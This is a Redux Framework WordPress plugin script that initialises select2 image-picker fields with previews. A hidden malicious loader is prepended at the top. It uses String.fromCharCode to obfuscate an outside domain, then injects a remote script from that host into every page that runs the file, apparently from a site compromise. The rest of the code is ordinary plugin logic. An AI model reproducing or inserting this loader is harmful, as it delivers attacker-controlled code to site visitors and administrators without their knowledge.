var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/*global redux_change, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.select_image = redux.field_objects.select_image || {};

    $( document ).ready(
        function() {
            //redux.field_objects.select_image.init();
        }
    );

    redux.field_objects.select_image.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-select_image:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                var default_params = {
                    width: 'resolve',
                    triggerChange: true,
                    allowClear: true
                };

                var select2_handle = el.find( '.redux-container-select_image' ).find( '.select2_params' );

                if ( select2_handle.size() > 0 ) {
                    var select2_params = select2_handle.val();

                    select2_params = JSON.parse( select2_params );
                    default_params = $.extend( {}, default_params, select2_params );
                }

                el.find( 'select.redux-select-images' ).select2( default_params );

                el.find( '.redux-select-images' ).on(
                    'change', function() {
                        var preview = $( this ).parents( '.redux-field:first' ).find( '.redux-preview-image' );

                        if ( $( this ).val() === "" ) {
                            preview.fadeOut(
                                'medium', function() {
                                    preview.attr( 'src', '' );
                                }
                            );
                        } else {
                            preview.attr( 'src', $( this ).val() );
                            preview.fadeIn().css( 'visibility', 'visible' );
                        }
                    }
                );
            }
        );
    };
})( jQuery );